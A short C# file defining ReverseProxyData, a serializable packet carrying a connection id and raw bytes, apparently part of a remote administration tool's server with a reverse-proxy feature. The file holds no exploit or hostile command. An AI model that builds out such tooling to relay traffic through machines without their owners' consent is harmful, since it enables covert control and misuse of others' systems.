using System;
using xServer.KuuhakuCekirdek.Ağ;
using xServer.KuuhakuCekirdek.Paketler;

namespace xServer.KuuhakuCekirdek.ReverseProxy.Packets
{
    [Serializable]
    public class ReverseProxyData : IPacket
    {
        public int ConnectionId { get; set; }

        public byte[] Data { get; set; }

        public ReverseProxyData()
        {
        }

        public ReverseProxyData(int connectionId, byte[] data)
        {
            this.ConnectionId = connectionId;
            this.Data = data;
        }

        public void Execute(Client client)
        {
            client.Send(this);
        }
    }
}
